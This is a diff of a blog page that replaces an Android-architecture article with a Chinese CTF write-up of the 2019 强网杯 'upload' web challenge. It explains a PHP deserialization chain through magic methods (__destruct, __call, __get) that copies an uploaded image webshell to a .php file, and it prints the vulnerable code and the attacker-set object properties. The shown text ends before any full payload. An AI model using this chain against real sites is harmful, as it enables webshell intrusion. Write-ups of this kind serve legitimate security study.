@@ -22,7 +22,7 @@
     <meta name="description" content="一花一世界，一木一森林">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <title>安卓架构分析 · Ethan&#39;s Blog</title>
+    <title>强网杯web部分writeup · Ethan&#39;s Blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -217,7 +217,7 @@
                 <a href="/">Ethan&#39;s Blog</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">安卓架构分析</a>
+                <a href="#" class="post-name">强网杯web部分writeup</a>
             </div>
     </div>
     
@@ -247,7 +247,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            安卓架构分析
+            强网杯web部分writeup
             <!-- 404 -->
             
         </h1>
@@ -266,18 +266,18 @@ height:50vh;
                 
                     <div class="post-intro-tags">
     
-        <a class="post-tag" href="javascript:void(0);" data-tags="安卓架构">安卓架构</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags="web">web</a>
     
 </div>
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">4.4k</span>阅读时长: <span class="post-count reading-time">15 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">2k</span>阅读时长: <span class="post-count reading-time">9 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2018/08/29</span>
+                    <span class="post-intro-time">2019/05/30</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -401,87 +401,87 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <p>.2003年Android公司成立</p>
-<p>.2005年被谷歌收购</p>
-<p>.2008年，HTC G1-第一部安卓手机发步。</p>
+        <h2 id="题记"><a href="#题记" class="headerlink" title="题记"></a><strong>题记</strong></h2><p>2019年的强网杯web题目出的都不错，所以对题目进行分析一下！</p>
 <a id="more"></a>
-<p><img src="https://bkog.oss-cn-shenzhen.aliyuncs.com/picture/a1.jpg" alt></p>
-<p>制作一个移动版的操作系统是谷歌最原始的初衷，后来的发展也是这样子进行的。有趣的是安卓的英文的意思是机器人。这也是为什么安卓的图标是个机器人的样子。</p>
-<p><img src="https://bkog.oss-cn-shenzhen.aliyuncs.com/picture/a2.png" alt></p>
-<p>Android碎片化问题</p>
-<p>· 24,093 Distinct Android devices seen this year</p>
-<p>· 18,796 Distinct Android devices seen last year</p>
-<p>· 682,000 Devices surveyed for this report.</p>
-<p>设备分布图<br><img src="https://bkog.oss-cn-shenzhen.aliyuncs.com/picture/a3.png" alt><br>安卓版本分布图</p>
-<p><img src="https://bkog.oss-cn-shenzhen.aliyuncs.com/picture/a4png.png" alt></p>
-<p>厂商</p>
-<p><img src="https://bkog.oss-cn-shenzhen.aliyuncs.com/picture/a5.png" alt><br><a href="https://opensignal.com/reports/2015/08/android-fragmentation/" target="_blank" rel="noopener">https://opensignal.com/reports/2015/08/android-fragmentation/</a></p>
-<p>Android碎片化带来的思考</p>
-<p>.难以通用攻击</p>
-<p>.难以完全防御</p>
-<p>对于安卓测试工程师的会怎么样呢？</p>
-<p>恐怕会是这个场景<br><img src="https://bkog.oss-cn-shenzhen.aliyuncs.com/picture/a6.jpg" alt></p>
-<p>可以想象安卓测试工程师不停的在点点点的情景。所以，在安卓上使用APP通常会出现闪退的情况，就是由于安卓碎片化所带来的兼容性测试难题。据玄武实验室透露，安卓版微信闪退的概率达到百分之一已经不错了。相比之下IOS系统便轻松的多，所以，企业推出APP，通常优先推出IOS版的。</p>
-<p>Android跟Java有什么关系？</p>
-<p>第一个要思考的就是只用Java便可以进行安卓开发吗？</p>
-<p>答案当然是肯定的。作为一个应用开发者仅用java开发安卓是可以，在写这篇文章之前，我跟我们教过安卓开发的老师交流过，她就是一个地地道道的纯java开发者。</p>
-<p>那么用java开发的好处是什么？这个问题和谷歌为什么用Linux Kernel而不自己写一个Kernel的答案是一样的。大家都想偷点懒，就像平时写代码总是不自觉的百度一下，有的话，便自己修改一下就用了。毕竟谁都不想35之前就脱发啊！使用java的好处就是可以解决安卓碎片化问题，避免了成堆的BUG，因为使用Java只需要管Java VM以下的针对硬件的API的问题，对于java VM之上的地方基本都是一样的。所以跨平台性很好。</p>
-<p>为什么还要使用NDK开发？</p>
-<p>● NDK</p>
-<p>Native Development Kit（NDK）是一系列工具的集合。它提供了一系列的工具，帮助开发者快速开发C/C++的动态库，并能自动将so和java一起打包成apk。</p>
-<p>● JNI</p>
-<p>Java Native Interface（JNI）标准是java平台的一部分，JNI是Java语言提供的Java和C/C++相互沟通的机制，Java可以通过JNI调用C/C++代码，C/C++的代码也可以调用java代码。</p>
-<p>● JNI与NDK的关系</p>
-<p>NDK可以为我们生成了C/C++的动态链接库，JNI是java和C/C++沟通的接口，两者与android没有半毛钱关系，只因为安卓是java程序语言开发，然后通过JNI又能与C/C++沟通，所以我们可以使用NDK+JNI来实现“Java+C”的开发方式。</p>
-<p>NDK开发具有以下优点： </p>
-<ol>
-<li>项目需要调用底层的一些C/C++的一些东西（java无法直接访问到操作系统底层（如系统硬件等）），或者已经在C/C++环境下实现了功能代码（大部分现存的开源库都是用C/C++代码编写的。），直接使用即可。NDK开发常用于驱动开发、无线热点共享、数学运算、实时渲染的游戏、音视频处理、文件压缩、人脸识别、图片处理等。 </li>
-<li>为了效率更加高效些。将要求高性能的应用逻辑使用C/C++开发，从而提高应用程序的执行效率。但是C/C++代码虽然是高效的，在java与C/C++相互调用时却增大了开销； </li>
-<li>基于安全性的考虑。防止代码被反编译，为了安全起见，使用C/C++语言来编写重要的部分以增大系统的安全性，最后生成so库（用过第三方库的应该都不陌生）便于给人提供方便。（任何有效的代码混淆对于会smail语法反编译你apk是分分钟的事，即使你加壳也不能幸免高手的攻击） </li>
-<li>便于移植。用C/C++写得库可以方便在其他的嵌入式平台上再次使用。</li>
-</ol>
-<p>总结的来说，使用C++开发的原因可以归结为两点，一是程序运行速度，一般热衷于ndk开发的，游戏公司居多。这就不用解释了。二是为了安全性考虑，腾讯肯定不会想王者明天成为别人的王者荣耀！</p>
-<p>安卓架构分析</p>
-<p> <img src="https://bkog.oss-cn-shenzhen.aliyuncs.com/picture/a7.jpg" alt></p>
-<p>首先需要从整体上了解Android系统的架构。Android系统大致可以划分为五个层次，它们分别是Linux内核层、硬件抽象层、运行时库层、应用程序框架层和应用程序层。其中，硬件抽象层从实现到使用上涉及了这五个层次。</p>
-<p>那么为什么要设置硬件抽象层HAL，其实这是谷歌的一个邪恶的计划。我们都知道Linux的原生的Kelnel是开源的，它是遵循GPL协议的，这个协议是非常严格的，如果你作为厂商对Linux源码进行了修改了的话，就必须公布出去，这显然会损害硬件厂商的利益，所以，谷歌自己加了个HAL层，在上面做一些闭源的开发。所以，严格的说，安卓系统并不是完全的开源，各大厂商都有自己的独特安卓系统，像小米，华为等等</p>
-<p>下面是引用了《进击的程序员》中对HAL层的描述：</p>
-<p>   Android系统的硬件抽象层（Hardware Abstract Layer，HAL）运行在用户空间中，它向下屏蔽硬件驱动模块的实现细节，向上提供硬件访问服务。通过硬件抽象层，Android系统分两层来支持硬件设备，其中一层实现在用户空间中，另一层实现在内核空间中。传统的Linux系统把对硬件的支持完全实现在内核空间中，即把对硬件的支持完全实现在硬件驱动模块中。</p>
-<p>Android系统为什么要把对硬件的支持划分为两层来实现呢？我们知道，一方面，Linux内核源代码是遵循GPL协议的，即如果我们在Android系统所使用的Linux内核中添加或者修改了代码，那么就必须将它们公开。因此，如果Android系统像其他的Linux系统一样，把对硬件的支持完全实现在硬件驱动模块中，那么就必须将这些硬件驱动模块源代码公开，这样就可能会损害移动设备厂商的利益，因为这相当于暴露了硬件的实现细节和参数。另一方面，Android系统源代码是遵循Apache License协议的，它允许移动设备厂商添加或者修改Android系统源代码，而又不必公开这些代码。因此，如果把对硬件的支持完全实现在Android系统的用户空间中，那么就可以隐藏硬件的实现细节和参数。然而，这是无法做到的，因为只有内核空间才有特权操作硬件设备。一个折中的解决方案便是将对硬件的支持分别实现在内核空间和用户空间中，其中，内核空间仍然是以硬件驱动模块的形式来支持，不过它只提供简单的硬件访问通道;而用户空间以硬件抽象层模块的形式来支持，它封装了硬件的实现细节和参数。这样就可以保护移动设备厂商的利益了。</p>
-<p>介绍Android系统的硬件抽象层的目的在于认识Android系统的体系结构，因为它的实现和使用依次涉及Android系统的硬件驱动模块、硬件抽象层、外部库和运行时库层、应用程序框架层和应用程序层等。</p>
-<p> <img src="https://bkog.oss-cn-shenzhen.aliyuncs.com/picture/a8.jpg" alt></p>
-<p>  我们还要着重分析一个层是运行时库层，因为Dalvik虚拟机在这个层，接下来我们将围绕运行时库层Dalvik虚拟机，JVM虚拟机，ART，三者的机制和区别。</p>
-<p>2014年6月25日，Android L 正式亮相于召开的谷歌I/O大会，Android L 改动幅度较大，谷歌将直接删除Dalvik，代替它的是传闻已久的ART。</p>
-<p> Android 4.4发布了一个ART运行时，准备用来替换掉之前一直使用的Dalvik虚拟机，希望籍此解决饱受诟病的性能问题。这里要分析的是ART是如何无缝替换掉原来的Dalvik虚拟机的。毕竟在原来的系统中，大量的代码都是运行在Dalvik虚拟机里面的。</p>
-<p>Dalvik虚拟机与Java虚拟机的最显著区别是它们分别具有不同的类文件格式以及指令集。Dalvik虚拟机使用的是dex（Dalvik Executable）格式的类文件，而Java虚拟机使用的是class格式的类文件。一个dex文件可以包含若干个类，而一个class文件只包括一个类。由于一个dex文件可以包含若干个类，因此它就可以将各个类中重复的字符串和其它常数只保存一次，从而节省了空间，这样就适合在内存和处理器速度有限的手机系统中使用。一般来说，包含有相同类的未压缩dex文件稍小于一个已经压缩的jar文件。</p>
-<p> 我们知道，Dalvik虚拟机实则也算是一个Java虚拟机，只不过它执行的不是class文件，而是dex文件。因此，ART运行时最理想的方式也是实现为一个Java虚拟机的形式，这样就可以很容易地将Dalvik虚拟机替换掉。注意，我们这里说实现为Java虚拟机的形式，实际上是指提供一套完全与Java虚拟机兼容的接口。例如，Dalvik虚拟机在接口上与Java虚拟机是一致的，但是它的内部可以是完全不一样的东西。</p>
-<p>实际上，ART运行时就是真的和Dalvik虚拟机一样，实现了一套完全兼容Java虚拟机的接口。为了方便描述，接下来我们就将ART运行时称为ART虚拟机，它和Dalvik虚拟机、Java虚拟机关系如图：</p>
-<p><img src="https://bkog.oss-cn-shenzhen.aliyuncs.com/picture/a9.png" alt></p>
-<p> 从图可以知道，Dalvik虚拟机和ART虚拟机都实现了三个用来抽象Java虚拟机的接口：</p>
-<ol>
-<li>JNI_GetDefaultJavaVMInitArgs – 获取虚拟机的默认初始化参数</li>
-</ol>
-<p>2.JNI_CreateJavaVM – 在进程中创建虚拟机实例</p>
-<ol>
-<li>JNI_GetCreatedJavaVMs – 获取进程中创建的虚拟机实例</li>
-</ol>
-<p>在Android系统中，Davik虚拟机实现在libdvm.so中，ART虚拟机实现在libart.so中。也就是说，libdvm.so和libart.so导出了JNI_GetDefaultJavaVMInitArgs、JNI_CreateJavaVM和JNI_GetCreatedJavaVMs这三个接口，供外界调用。</p>
-<p>此外，Android系统还提供了一个系统属性persist.sys.dalvik.vm.lib，它的值要么等于libdvm.so，要么等于libart.so。当等于libdvm.so时，就表示当前用的是Dalvik虚拟机，而当等于libart.so时，就表示当前用的是ART虚拟机。</p>
-<p>以上描述的Dalvik虚拟机和ART虚拟机的共同之处，当然它们之间最显著还是不同之处。不同的地方就在于，Dalvik虚拟机执行的是dex字节码，ART虚拟机执行的是本地机器码。这意味着Dalvik虚拟机包含有一个解释器，用来执行dex字节码。当然，Android从2.2开始，也包含有JIT（Just-In-Time），用来在运行时动态地将执行频率很高的dex字节码翻译成本地机器码，然后再执行。通过JIT，就可以有效地提高Dalvik虚拟机的执行效率。但是，将dex字节码翻译成本地机器码是发生在应用程序的运行过程中的，并且应用程序每一次重新运行的时候，都要做重做这个翻译工作的。因此，即使用采用了JIT，Dalvik虚拟机的总体性能还是不能与直接执行本地机器码的ART虚拟机相比。</p>
-<p>  那么，ART虚拟机执行的本地机器码是从哪里来的呢？Android的运行时从Dalvik虚拟机替换成ART虚拟机，并不要求开发者要将重新将自己的应用直接编译成目标机器码。也就是说，开发者开发出的应用程序经过编译和打包之后，仍然是一个包含dex字节码的APK文件。既然应用程序包含的仍然是dex字节码，而ART虚拟机需要的是本地机器码，这就必然要有一个翻译的过程。这个翻译的过程当然不能发生应用程序运行的时候，否则的话就和Dalvik虚拟机的JIT一样了。在计算机的世界里，与JIT相对的是AOT。AOT进Ahead-Of-Time的简称，它发生在程序运行之前。我们用静态语言（例如C/C++）来开发应用程序的时候，编译器直接就把它们翻译成目标机器码。这种静态语言的编译方式也是AOT的一种。但是前面我们提到，ART虚拟机并不要求开发者将自己的应用直接编译成目标机器码。这样，将应用的dex字节码翻译成本地机器码的最恰当AOT时机就发生在应用安装的时候。<br>总结</p>
-<p>Dalvik和JVM有啥关系？</p>
-<p>主要区别：<br>Dalvik是基于寄存器的，而JVM是基于栈的。<br>Dalvik运行dex文件，而JVM运行java字节码<br>自Android 2.2开始，Dalvik支持JIT（just-in-time，即时编译技术）。<br>优化后的Dalvik较其他标准虚拟机存在一些不同特性:　<br>1.占用更少空间　<br>2.为简化翻译，常量池只使用32位索引（存放字符串常量和基本类型常量（public static final）。 常量值通常直接存放在程序代码内部，这样做是安全的，因为它们永远不会被改变。）　<br>3.标准Java字节码实行8位堆栈指令,Dalvik使用16位指令集直接作用于局部变量。局部变量通常来自4位的“虚拟寄存器”区。这样减少了Dalvik的指令计数，提高了翻译速度。　<br>　当Android启动时，Dalvik VM 监视所有的程序（APK），并且创建依存关系树，为每个程序优化代码并存储在Dalvik缓存中。Dalvik第一次加载后会生成Cache文件，以提供下次快速加载，所以第一次会很慢。<br>Dalvik解释器采用预先算好的Goto地址，每个指令对内存的访问都在64字节边界上对齐。这样可以节省一个指令后进行查表的时间。为了强化功能, Dalvik还提供了快速翻译器（Fast Interpreter）。</p>
-<p>一般来说,基于堆栈的机器必须使用指令才能从堆栈上的加载和操作数据,因此,相对基于寄存器的机器，它们需要更多的指令才能实现相同的性能。但是基于寄存器机器上的指令必须经过编码,因此,它们的指令往往更大。</p>
-<p>Dalvik虚拟机既不支持Java SE 也不支持Java ME类库(如：Java类,AWT和Swing都不支持)。 相反,它使用自己建立的类库（Apache Harmony Java的一个子集）。</p>
-<p>什么是ART？</p>
-<p>即Android Runtime<br>ART 的机制与 Dalvik 不同。在Dalvik下，应用每次运行的时候，字节码都需要通过即时编译器（just in time ，JIT）转换为机器码，这会拖慢应用的运行效率，而在ART 环境中，应用在第一次安装的时候，字节码就会预先编译成机器码，使其成为真正的本地应用。这个过程叫做预编译（AOT,Ahead-Of-Time）。这样的话，应用的启动(首次)和执行都会变得更加快速。</p>
-<p>ART有什么优缺点呢？</p>
-<p> 优点：</p>
-<p>1、系统性能的显著提升。<br>2、应用启动更快、运行更快、体验更流畅、触感反馈更及时。<br>3、更长的电池续航能力。<br>4、支持更低的硬件。<br>缺点：<br>1.机器码占用的存储空间更大，字节码变为机器码之后，可能会增加10%-20%（不过在应用包中，可执行的代码常常只是一部分。比如最新的 Google+ APK 是 28.3 MB，但是代码只有 6.9 MB。）<br>2.应用的安装时间会变长。</p>
-<p>其实我日后安卓研究最多的是Dalvik虚拟机和ART虚拟机，对于ART其实就是采用了空间换时间大法而已。当我们开机时遇见程序正在优化中很慢的那种。那么你的手机很可能正在使用的就是ART虚拟机。</p>
-<p>tips：现在智能手机大部分都可以让用户选择使用Dalvik还是ART模式。当然默认还是使用Dalvik模式。</p>
-<p>用法：设置-辅助功能-开发者选项（开发人员工具）-选择运行环境（不同的手机设置的步骤可能不一样），事实证明很可能就找不到大笑。不过还是贴别人的图。<br><img src="https://bkog.oss-cn-shenzhen.aliyuncs.com/picture/a10.png" alt></p>
-<p>下面这个图是我导出的手机的本地配置文件，并且在ART的地方做了批注：<br><img src="https://bkog.oss-cn-shenzhen.aliyuncs.com/picture/a11.png" alt></p>
+<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a><strong>正文</strong></h2><h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a><strong>upload</strong></h2><p>首先打开界面如下：</p>
+<p><img src="https://www.fuzzer.xyz/images/qwb/1.png" alt></p>
+<p>有注册和登陆功能！</p>
+<p>首先我们注册一个账户，然后登陆，发现可以上传图片</p>
+<p><img src="https://www.fuzzer.xyz/images/qwb/2.png" alt></p>
+<p><img src="https://www.fuzzer.xyz/images/qwb/3.png" alt></p>
+<p>这里首先想到的就是上传木马，但是经过尝试只能上传图片马，并且不能直接利用，经过抓包发现cookie是序列化内容，所以应该是通过cookie传递序列化内容，经过服务器的反序列化，然后对图片进行重命名操作，进而获得shell</p>
+<p><img src="https://www.fuzzer.xyz/images/qwb/11.png" alt></p>
+<p><img src="https://www.fuzzer.xyz/images/qwb/12.png" alt></p>
+<p>但是，这种操作是需要源码的，没有源码分析进行反序列化操作，是非常困难的，所以我们进行目录探测发现了<a href="http://www.tar.gz，里面包含源码，并且存在.idea文件，所以直接用phpstorm打开发现断点，可能是出题人故意的吧，不过谁知道呢:)，分别是在`application/web/controller/Register.php`" target="_blank" rel="noopener">www.tar.gz，里面包含源码，并且存在.idea文件，所以直接用phpstorm打开发现断点，可能是出题人故意的吧，不过谁知道呢:)，分别是在`application/web/controller/Register.php`</a> 和 <code>application/web/controller/Index.php</code></p>
+<p><code>application/web/controller/Register.php</code></p>
+<p><img src="https://www.fuzzer.xyz/images/qwb/14.png" alt></p>
+<p><code>application/web/controller/Index.php</code></p>
+<p><img src="https://www.fuzzer.xyz/images/qwb/13.png" alt></p>
+<p>这两个断点给了我们的几点信息：</p>
+<ul>
+<li><code>Register.php</code>有一个析构方法，可知如果未登录网站进行访问的话，就会调用<code>index</code>的<code>index()</code>方法，而<code>index()</code>方法是一个登陆检测</li>
+</ul>
+<p><img src="https://www.fuzzer.xyz/images/qwb/15.png" alt></p>
+<ul>
+<li><code>index.php</code>会对传入的<code>cookie</code>先进行base64解码，然后对其进行反序列化操作，再把数据拿到数据库进行对比</li>
+</ul>
+<p>仅有以上信息还是不够的，我们的目的是找到对文件名进行重赋值的方法，目前我们还做不到，所以继续审计，可以得到以下三个重要的文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">web/controller/Index.php</span><br><span class="line">web/controller/Profile.php</span><br><span class="line">web/controller/Register.php</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_img</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;checker)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;checker-&gt;login_check())&#123;</span><br><span class="line">                $curr_url=<span class="string">"http://"</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].$_SERVER[<span class="string">'SCRIPT_NAME'</span>].<span class="string">"/index"</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;redirect($curr_url,<span class="number">302</span>);</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filename_tmp=$_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filename=md5($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]).<span class="string">".png"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ext_check();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ext) &#123;</span><br><span class="line">            <span class="keyword">if</span>(getimagesize(<span class="keyword">$this</span>-&gt;filename_tmp))&#123;</span><br><span class="line">                @copy(<span class="keyword">$this</span>-&gt;filename_tmp, <span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">                @unlink(<span class="keyword">$this</span>-&gt;filename_tmp);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;img=<span class="string">"../upload/$this-&gt;upload_menu/$this-&gt;filename"</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;update_img();&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;error(<span class="string">'Forbidden type!'</span>, url(<span class="string">'../index'</span>));&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error(<span class="string">'Unknow file type!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>其中操作文件行为为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(getimagesize(<span class="keyword">$this</span>-&gt;filename_tmp))&#123;</span><br><span class="line">@copy(<span class="keyword">$this</span>-&gt;filename_tmp, <span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">@unlink(<span class="keyword">$this</span>-&gt;filename_tmp);</span><br></pre></td></tr></table></figure>
+<p>我们跟一下跟进<code>$this-&gt;filename_tmp</code>和<code>$this-&gt;filename</code> 发现并没限制，但是有一个阻碍</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES))&#123;</span><br><span class="line">           <span class="keyword">$this</span>-&gt;filename_tmp=$_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">           <span class="keyword">$this</span>-&gt;filename=md5($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]).<span class="string">".png"</span>;</span><br><span class="line">           <span class="keyword">$this</span>-&gt;ext_check();</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>
+<p>我们需要绕过这里的判断，我们只需要使用GET请求即可绕过</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;checker)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;checker-&gt;login_check())&#123;</span><br><span class="line">        $curr_url=<span class="string">"http://"</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].$_SERVER[<span class="string">'SCRIPT_NAME'</span>].<span class="string">"/index"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;redirect($curr_url,<span class="number">302</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>上面的判读可以通过直接通过设置类中属性进行bypass，来绕过if判断</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> $checker=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">public</span> $filename_tmp=<span class="string">"../public/upload/9c1534b1e8dbb5a0c0ec3f70d24f9627/0d44a7f4f1ae189a4c1d88b83f66ec68.png"</span>;</span><br><span class="line"><span class="keyword">public</span> $filename=<span class="string">"../public/upload/9c1534b1e8dbb5a0c0ec3f70d24f9627/ethan.php"</span>;</span><br></pre></td></tr></table></figure>
+<p>文件路径通过以下代码获得</p>
+<p><img src="https://www.fuzzer.xyz/images/qwb/17.png" alt></p>
+<p>我们进入第三个if判断</p>
+<p>当该值进入<code>upload_img</code>函数后，接下来就可以利用<code>copy</code>复制出php文件，但是问题是怎么通过反序列化直接调用<code>upload_img</code>函数</p>
+<p>这里我们要用到两个魔术方法</p>
+<ul>
+<li><p>读取不可访问属性的值时，<a href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.get" target="_blank" rel="noopener">__get()</a> 会被调用。</p>
+</li>
+<li><p>在对象中调用一个不可访问方法时，<a href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.call" target="_blank" rel="noopener">__call()</a> 会被调用。</p>
+</li>
+</ul>
+<p>我们在以下代码中找到这两个魔术方法，分别书写了在调用不可调用方法和不可调用成员变量时怎么做。<code>get</code> 会直接从 <code>except</code> 里找，<code>call</code> 会调用自身的 <code>name</code> 成员变量所指代的变量所指代的方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;except[$name];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我们知道当对象调用不可访问属性时，就会自动触发<strong><code>get</code>魔法方法，而在对象调用不可访问函数时，就会自动触发</strong><code>call</code>魔法方法。<br>    那么寻找触发方式可以发现文件<code>web/controller/Register.php</code>，关键部分如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $registed;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker=<span class="keyword">new</span> Index();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;registed)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checker-&gt;index();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>我们可以看到checker调用了类Index里的方法index()，如果我们此时将checker的<code>destruct</code>覆盖为类Profile，那么势必在调用index()方法时，会触发<code>call</code>函数，因为check对象的index()方法是在Profile.php中不存在的</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
